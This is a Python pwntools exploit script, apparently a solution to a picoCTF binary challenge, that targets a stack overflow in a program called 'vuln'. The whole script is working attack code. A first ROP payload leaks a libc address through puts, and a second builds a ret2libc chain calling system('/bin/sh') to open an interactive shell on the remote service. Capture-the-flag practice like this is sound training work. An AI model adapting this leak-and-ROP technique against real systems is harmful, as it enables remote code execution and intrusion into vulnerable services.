#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
context.binary = exe

PADDING = b'A' * 112 + b'B' * 24

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 62289)

    return r


def main():
    r = conn()

    # Useful gadget
    pop_rdi = ROP(exe).find_gadget(['pop rdi', 'ret'])[0]

    # Functions address for the first payload to leak LIBC base address
    puts_plt = exe.plt['puts']
    func_got = exe.got['setbuf']
    main_plt = exe.symbols['main']

    payload = PADDING + p64(pop_rdi) + p64(func_got) + p64(puts_plt) + p64(main_plt)
    r.sendlineafter('sErVeR!\n', payload)

    leak = r.recvlines(2)[1]
    libc.address = u64(leak.ljust(8, b"\x00")) - libc.symbols['setbuf']
    log.info(f"Leaked LIBC address: {hex(libc.address)}")

    # Functions address for the second payload to spawn a shell
    bin_sh   = next(libc.search(b'/bin/sh'))
    system   = libc.symbols['system']
    exit     = libc.symbols['exit']
    ret_istr = ROP(exe).find_gadget(['ret'])[0]
    
    # https://stackoverflow.com/questions/4175281/what-does-it-mean-to-align-the-stack
    payload =  PADDING
    payload += p64(ret_istr)     # Dummy 'ret' just to align the stack to 16 bytes for SIMD instr. (the only way out, otherwise 'system' will crash)
    payload += p64(pop_rdi) + p64(bin_sh) + p64(system)
    payload += p64(pop_rdi) + p64(0) + p64(exit)    # Clean exit

    r.sendlineafter('sErVeR!\n', payload)
    r.interactive()


if __name__ == "__main__":
    main()
